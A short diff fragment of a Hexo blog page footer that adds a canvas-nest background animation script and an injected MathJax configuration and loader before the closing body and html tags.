+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
